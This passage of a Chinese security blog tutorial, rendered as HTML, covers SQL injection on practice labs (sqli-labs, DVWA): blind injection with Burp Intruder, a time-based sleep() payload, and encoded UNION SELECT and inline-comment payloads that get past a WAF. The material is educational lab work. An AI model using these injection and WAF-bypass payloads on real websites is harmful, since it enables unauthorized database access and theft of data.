+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-22_hua121732b08337fee74db14ff8a4131d9_120437_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-22_hua121732b08337fee74db14ff8a4131d9_120437_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="157"
+		data-flex-basis="377px"
+	
+></p>
+<p>扔进<code>Intruder</code>模块</p>
+<p>把中间一个<code>1</code>和<code>a</code>作为参数，然后选择<code>Cluster bomb</code>模式</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-29.png"
+	width="1158"
+	height="597"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-29_hucad65bd0ba988428d3f28c680d34d15f_95510_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-29_hucad65bd0ba988428d3f28c680d34d15f_95510_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="193"
+		data-flex-basis="465px"
+	
+></p>
+<p>对每个字符进行遍历</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-31.png"
+	width="1141"
+	height="421"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-31_hufff1d550fde8e63a64415b552051285b_34654_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-31_hufff1d550fde8e63a64415b552051285b_34654_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="271"
+		data-flex-basis="650px"
+	
+></p>
+<p>每个字符可能是a-z</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-33.png"
+	width="1138"
+	height="477"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-33_hud2246acf058c6338a36f9840308d345f_38212_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-33_hud2246acf058c6338a36f9840308d345f_38212_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="238"
+		data-flex-basis="572px"
+	
+></p>
+<p><strong>Start Attack!</strong></p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/39.jpg"
+	width="120"
+	height="104"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/39_hu76cdffda0857d6e642563bf1c5bcd23d_2924_480x0_resize_q75_box.jpg 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/39_hu76cdffda0857d6e642563bf1c5bcd23d_2924_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="斯哈斯哈"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="115"
+		data-flex-basis="276px"
+	
+></p>
+<p>最后将成功的筛选出来并进行排序</p>
+<p>美滋滋，数据跃然窗口上(什</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-38.png"
+	width="840"
+	height="609"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-38_hu0ecf31f4655d2d94ba3e519438f96c56_66061_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_01-38_hu0ecf31f4655d2d94ba3e519438f96c56_66061_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="事admin!"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="137"
+		data-flex-basis="331px"
+	
+></p>
+<h3 id="时间型盲注">时间型盲注</h3>
+<blockquote>
+<p>为什么叫时间型</p>
+<p>&ndash;因为依据返回结果是否有延迟来判断</p>
+</blockquote>
+<p>打开sqli-labs靶场的第九关</p>
+<p>我们发现参数id无论是<code>1</code>,<code>1' and 1=1</code>还是<code>1' and 1=2</code>提示的结果都是一样的</p>
+<h4 id="继续思考">继续思考</h4>
+<p>现在<strong>没有报错</strong>了，也<strong>没有提示是或者否</strong>了</p>
+<p>我们试想一下，我们可以让数据库:</p>
+<ul>
+<li>
+<p>如果判断内容为真就延迟一段时间</p>
+</li>
+<li>
+<p>如果判断内容为假就不进行延迟操作</p>
+</li>
+</ul>
+<p>这就可以引出一种新的注入方式:时间型盲注</p>
+<p>用上面问人问题的例子来讲的话,就是问他是不是xxx的时候，如果是，那个人会结巴= =</p>
+<p>时间型盲注与布尔型盲注的区别在于，时间型盲注是利用<code>sleep()</code>或<code>benchmark()</code>等函数让数据库执行的时间变长</p>
+<blockquote>
+<p>这里需要用到一个函数<code>if()</code></p>
+<p>比如:<code>if(a,b,c)</code>表明</p>
+<p>如果a为真则返回值为b,否则返回值为c</p>
+</blockquote>
+<h4 id="注入案例演示">注入案例演示</h4>
+<p>由于时间型盲注和和布尔型盲注逻辑上类似，</p>
+<p>区别就是一个是依照网页输出判断是否，一个是依照返回时间判断是否</p>
+<p>这里不再继续演示具体步骤</p>
+<hr>
+<p>举一个时间型盲注的<del>糖炒栗子</del>例子</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="mi">1</span><span class="s1">&#39; and if(length(database())&gt;1,sleep(5),1)--+
+</span></code></pre></div><p>大意就是:如果数据库名字长度大于1，就延迟5秒，否则if语句返回1(也就是不延迟)</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-25.png"
+	width="1160"
+	height="578"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-25_hu90eaab0fb56ef4d7a9574920cf7d64d0_133378_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-25_hu90eaab0fb56ef4d7a9574920cf7d64d0_133378_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="延迟了喵!"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
+		data-flex-basis="481px"
+	
+></p>
+<p>我们可以看到这里发生了延迟，证明存在时间型盲注</p>
+<p>至于其他查询库名，表名等等的操作，基本逻辑与布尔型盲注类似，就是需要在原先逻辑上加一个if判断，要是结果为真就延迟，否则不延迟</p>
+<blockquote>
+<p>Tip:这个延迟的时间最好不要太长(浪费时间)或者太短(无法分辨)</p>
+</blockquote>
+<h3 id="交srcの小技巧">交SRCの小技巧</h3>
+<p>除了跑SQLmap之外，还有一个非常直接证明SQL注入的好方法</p>
+<p>就是用一个时间盲注payload放进burp的repeater,然后趁延迟的时候截图</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-32.png"
+	width="1164"
+	height="547"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-32_hu7fae41692b7d587401a9736f88571a76_65306_480x0_resize_box_3.png 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2022-08-31_15-32_hu7fae41692b7d587401a9736f88571a76_65306_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="你看它没出来，肯定有问题啊= ="
+	
+	
+		class="gallery-image" 
+		data-flex-grow="212"
+		data-flex-basis="510px"
+	
+></p>
+<p>就可以轻松证明存在SQL注入</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/44.jpg"
+	width="1772"
+	height="1391"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/44_hu85a3b2b9bdd12e77a0df4ce838f095d0_213626_480x0_resize_q75_box.jpg 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/44_hu85a3b2b9bdd12e77a0df4ce838f095d0_213626_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="127"
+		data-flex-basis="305px"
+	
+></p>
+<h2 id="实验中发现の小注意点">实验中发现の小注意点</h2>
+<h3 id="强烈建议不要用win搭建渗透测试环境">强烈建议不要用Win搭建渗透测试环境</h3>
+<p>为什么?</p>
+<p>如果你不想要BUG满天飞的话就建议这样&hellip;  即答)</p>
+<h3 id="illegal-mix-of-collations-for-operation-union">Illegal mix of collations for operation &lsquo;UNION&rsquo;</h3>
+<p>又到了激动人心的解决报错的环节了.QwQ.</p>
+<p>谷歌一下，这个错大概是在爆表名的时候不同数据库的字段编码不同的原因= =</p>
+<blockquote>
+<p>相同字段的编码为 <code>utf8_general_ci</code> 与 <code>utf8_unicode_ci</code>，就会报<code>Illegal mix of collations for operation “UNION”</code>的错误。</p>
+<p>由于<code>information_schame.tables</code>中的<code>table_name</code>的编码为 <code>utf8_general_ci</code>，而<code>union</code>前的字段编码为<code>utf8_unicode_ci</code>, 导致<code>union</code>前后编码分别为<code>utf8_unicode_ci</code> 与 <code>utf8_general_ci</code> ，所以会报错。</p>
+</blockquote>
+<p>至于解决方案嘛</p>
+<ul>
+<li>
+<p>再找一个编码合适的注入点</p>
+</li>
+<li>
+<p><strong>直接上盲注,不用UNION (推荐方法)</strong></p>
+</li>
+</ul>
+<h2 id="waf绕过">WAF绕过</h2>
+<blockquote>
+<p>本机DVWA配上安全狗狗</p>
+</blockquote>
+<p>从前有一只黑客猫想要入侵一个网站，瑟瑟发抖的网站请来了安全狗&hellip;</p>
+<p>然后&hellip;</p>
+<p>一场喵喵队和汪汪队的大战拉开帷幕&hellip;</p>
+<h3 id="检测union-select">检测UNION SELECT</h3>
+<p>单独的UNION或者单独的SELECT是不会拦截的，只有这两个家伙在一起的时候才会拦截，而且UNION和SELECT中间无论加什么都会拦截</p>
+<blockquote>
+<p>尝试了大小写 <strong>(这个方法目前应该是废了，要是绕不过那WAF纯属有大病了)</strong> ，URL编码，注释，内联注释，都寄了;(</p>
+</blockquote>
+<h4 id="get--post">GET&ndash;&gt;POST</h4>
+<p>灵机一动，要不换个请求方式</p>
+<p>哈哈，不出所料，居然用POST请求就绕过去了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/vulnerabilities/sqli/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="err">...</span>
+<span class="g">...
+</span><span class="g">id=-1&#39;+%75%6e%69%6f%6e%20%73%65%6c%65%63%74+1,2%23&amp;Submit=Submit
+</span></code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/1.jpg"
+	width="1917"
+	height="858"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/1_hue9593e422fd1379af5d21c3d90fc1e16_108518_480x0_resize_q75_box.jpg 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/1_hue9593e422fd1379af5d21c3d90fc1e16_108518_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="就这样坏喵喵绕过了汪汪队"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="223"
+		data-flex-basis="536px"
+	
+></p>
+<blockquote>
+<p>P.S. 不用URL编码也可以0.0</p>
+</blockquote>
+<h3 id="检测databaseuser等函数">检测database(),user()等函数</h3>
+<p>之前的POST+URL编码居然废了</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2.jpg"
+	width="200"
+	height="230"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2_hu5fad17c973d9da7d1043e095b3218feb_8375_480x0_resize_q75_box.jpg 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/2_hu5fad17c973d9da7d1043e095b3218feb_8375_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="啊啊啊啊啊！！！喵能狂怒"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="86"
+		data-flex-basis="208px"
+	
+></p>
+<blockquote>
+<p>以database()为例</p>
+<p>大概分析了一下，是<code>database()</code>这一坨在一起的时候才会拦截，</p>
+<p>尝试拼接逝世看吧0.0</p>
+</blockquote>
+<h4 id="concat拼接逝世了">concat拼接(逝世了)</h4>
+<p>莫名想到课上讲过concat()字符拼接</p>
+<p>但终究它还是<b><font size="4">拼成了字符!!!</font></b></p>
+<p>逝世了，因为他是字符，起不到函数的作用了=   =</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/3.jpg"
+	width="1916"
+	height="856"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/3_hu0e04cd88027132776cc0a6c1eb77a561_109337_480x0_resize_q75_box.jpg 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/3_hu0e04cd88027132776cc0a6c1eb77a561_109337_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="寄寄子来喽"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="223"
+		data-flex-basis="537px"
+	
+></p>
+<h4 id="利用函数名feature进行拼接">利用函数名&quot;feature&quot;进行拼接</h4>
+<p>在无意中发现<code>database()</code>和<code>database ()</code>都是可以执行的</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/5.jpg"
+	width="1265"
+	height="584"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/5_huc78525c57ee757d603e2674b2c4884df_71236_480x0_resize_q75_box.jpg 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/5_huc78525c57ee757d603e2674b2c4884df_71236_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="519px"
+	
+></p>
+<p>唔&hellip;..既然这样我们岂不是能利用这个空格进行ByPass</p>
+<p>试试看!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/vulnerabilities/sqli/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="err">...</span>
+<span class="g">...
+</span><span class="g">id=-1&#39;+%75%6e%69%6f%6e%20%73%65%6c%65%63%74+1,database%20()%23&amp;Submit=Submit
+</span></code></pre></div><p>同理，用连接符&quot;+&ldquo;也可以绕过成功</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/vulnerabilities/sqli/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="err">...</span>
+<span class="g">...
+</span><span class="g">id=-1&#39;+%75%6e%69%6f%6e%20%73%65%6c%65%63%74+1,database+()%23&amp;Submit=Submit
+</span></code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/4.jpg"
+	width="1871"
+	height="859"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/4_huf27e04fc984bf586d3e0ff49fbf838e5_106006_480x0_resize_q75_box.jpg 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/4_huf27e04fc984bf586d3e0ff49fbf838e5_106006_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="217"
+		data-flex-basis="522px"
+	
+></p>
+<h3 id="绕过select-a-from-b格式检测">绕过SELECT A FROM B格式检测</h3>
+<p>经过了多次疯狂试探后，发现只有在<strong>完整的(指两个关键字没有被分割或者缺失/多余字母)</strong> 的SELECT和FROM后面同时有内容(一些特殊字符除外)WAF才会<del>WOOF</del>拦截.</p>
+<h4 id="round-1-替换空格">Round 1: 替换空格</h4>
+<p>把空格换成各种奇形怪状的格式，以及用注释替代空格</p>
+<p>一个字，寄.</p>
+<p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/woof.jpg"
+	width="882"
+	height="644"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/woof_hud0d28e0e45e5b28b6ac43c77866cf8f8_26272_480x0_resize_q75_box.jpg 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/woof_hud0d28e0e45e5b28b6ac43c77866cf8f8_26272_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+		alt="呜呜呜，别咬我了，疼疼疼"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="136"
+		data-flex-basis="328px"
+	
+></p>
+<h4 id="round-2-select和from用注释劈开">Round 2: SELECT和FROM用注释劈开</h4>
+<p>寄.虽说绕过去了，但语句不被识别了，直接报错&hellip;</p>
+<blockquote>
+<p>猜想原因: 注释<code>/**/</code>相当于空格，关键词被空格分开了自然无法执行了= =</p>
+</blockquote>
+<h4 id="round-3-使用内联注释url编码的盲注payload">Round 3: 使用内联注释+URL编码的盲注payload</h4>
+<p>喵哈哈哈哈~~,终于ok了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/vulnerabilities/sqli/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="err">...</span>
+<span class="g">...
+</span><span class="g">id=1&#39;+and+(/*!40000%53elect*//**/count(table_name)+from+information_schema.tables+where+table_schema=&#39;dvwa&#39;)=2%23&amp;Submit=Submit
+</span></code></pre></div><p><img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/6.jpg"
+	width="1883"
+	height="862"
+	srcset="/zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/6_hud2b77168914efaf3f0e853fbdabc6de4_113966_480x0_resize_q75_box.jpg 480w, /zh-cn/p/web%E5%AE%89%E5%85%A8sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%92%8C%E7%AE%80%E5%8D%95%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/6_hud2b77168914efaf3f0e853fbdabc6de4_113966_1024x0_resize_q75_box.jpg 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="218"
+		data-flex-basis="524px"
+	
+></p>
+<h2 id="ref">ref</h2>
+<p><a class="link" href="https://m.freebuf.com/articles/web/288401.html"  target="_blank" rel="noopener"
+    >https://m.freebuf.com/articles/web/288401.html</a></p>
+<p><a class="link" href="http://book.fsec.io/"  target="_blank" rel="noopener"
+    >http://book.fsec.io/</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/zh-cn/tags/web-sec/">Web Sec</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/zh-cn/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/">
+        
+        
+            <div class="article-image">
+                <img src="/zh-cn/p/web%E5%AE%89%E5%85%A8sqlmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/cover.9d82c93a778151369b9b278f395442f3_hueaab6e369cc918621c3d9ceadcb592b0_131577_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:sqlmap常用参数整理"
+                        
